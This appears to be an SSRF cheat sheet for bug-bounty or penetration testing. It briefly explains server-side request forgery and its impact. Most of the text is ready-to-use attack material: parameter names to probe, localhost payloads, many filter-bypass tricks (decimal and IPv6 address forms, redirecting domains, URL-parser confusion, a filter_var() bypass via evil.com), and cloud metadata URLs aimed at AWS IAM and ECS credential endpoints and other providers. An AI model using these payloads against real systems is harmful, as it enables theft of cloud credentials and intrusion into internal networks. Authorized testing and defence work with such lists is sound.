## What is SSRF?

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL, which the code running on the server will read or submit data. By carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP-enabled databases or perform POST requests towards internal services that are not intended to be exposed.

The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (like path traversal, etc.).

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs, the attacker may be able to read data from services that are not directly exposed on the internet:

- **Cloud server meta-data** — Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted
- **Database HTTP interfaces** — NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data internal REST interfaces
- **Files** — The attacker may be able to read files using file:// URIs. The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.

## What is its impact?

A malicious actor can retrieve the content of arbitrary files on the system, which leads to sensitive information exposure(passwords, source code, confidential data, etc.).

1. Sensitive Data Exposure
2. Unauthenticated Requests
3. Port Scans or Cross Site Port Attack (XSPA)
4. Protocol Smuggling

## **Key Points To Test SSRF Vulnerability :**

1. Always make sure that you are making request to back end server on the behalf of public server not from the browser.
2. To fetch the data from server also try http://localhost/xyz/ with the http://127.0.0.1/xyz.
3. Server may have the firewall protection always try to bypass the firewall if possible.
4. Make sure that request is coming from server not from your local host.

## Where to look for :

```jsx
uri=
logout_redirect_uri=
url=
page=
proxy=
fwd=
forward=
u=
data=
page=
url=	
ret=	
r2=	
img=	
u	
return	
r	
URL	
next	
redirect	
redirectBack	
AuthState	
referer	
redir	
l	
aspxerrorpath	
image_path	
ActionCodeURL	
return_url	0
link	
q	
location	
ReturnUrl	
uri	
referrer	
returnUrl
forward	
file
rb	
end_display	
urlact	
from	
goto	
path	
redirect_url	
old	
pathlocation	
successTarget	
returnURL	
urlsito	
newurl	
Url	
back	
retour	
odkazujuca
r_link	
cur_url	
H_name	
ref	
topic	
resource	
returnTo	
home	0.2%
node	0.2%
sUrl	0.2%
href	0.2%
linkurl	0.2%
returnto	0.2%
redirecturl	0.2%
SL	0.2%
st	0.2%
errorUrl	0.2%
media	0.2%
destination	0.2%
targeturl	0.2%
return_to	0.2%
cancel_url	0.2%
doc	0.2%
GO	0.2%
ReturnTo	0.2%
anything	0.2%
FileName	0.2%
logoutRedirectURL	0.2%
list	0.2%
startUrl	0.2%
service	0.2%
redirect_to	0.2%
end_url	0.2%
_next	0.2%
noSuchEntryRedirect	0.2%
context	0.2%
returnurl	0.2%
ref_url	0.2%
```

## 1-SSRF attacks against the server itself

In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This will typically involve supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost.

Basic Localhost Payloads:

```
http://127.0.0.1:port
http://localhost:port
https://127.0.0.1:port
https://localhost:port
http://[::]:port
http://0000::1:port
http://[0:0:0:0:0:ffff:127.0.0.1]
http://0/
http://127.1
http://127.0.1
```

**Steps to reproduce:**

1-Try to use burpcollab to check if the server fetches data from an internal system(interacting with backend)

2-Send request to localhost

3-Try to perform sensitive actions as an unauthenicated users

```jsx
**Bypasses for Localhost

1-**Bypass using HTTPS
https://127.0.0.1/
https://localhost/

2-Bypass localhost with [::]
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid

3-Bypass localhost with a domain redirection
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost

4-Bypass localhost with CIDR
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

5-Bypass using a decimal IP location
http://0177.0.0.1/
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/  = http://169.254.169.254

6-Bypass using IPv6/IPv4 Address Embedding
http://[0:0:0:0:0:ffff:127.0.0.1]

7-Bypass using malformed urls
localhost:+11211aaa
localhost:00011211aaaa

8-Bypass using rare address
http://0/
http://127.1
http://127.0.1

9-Bypass using URL encoding
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin

10-Bypass using tricks combination
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3

11-Bypass using enclosed alphanumerics
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

12-Bypass filter_var() php function
0://evil.com:80;http://google.com:80/

13-Bypass against a weak parser
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

## 2-SSRF URL for Cloud Instances

```jsx
AWS
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
```

```jsx
Google Cloud
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

```jsx
Azure:
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

```jsx
IPv6 Tests:
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
```

```jsx
ECS Task: 
http://169.254.170.2/v2/credentials/
```

```jsx
Digital Ocean:
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

```jsx
Packetcloud:
https://metadata.packet.net/userdata
```

```jsx
Oracle Cloud:
http://169.254.169.254/opc/v1/instance/
```

```jsx
Alibaba Cloud:
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/user-data
```

## **Impact:**

An attacker can tunnel into internal networks and access sensitive internal data such as AWS metadata information.


## Author:
[Tushar Verma](https://twitter.com/e11i0t_4lders0n)
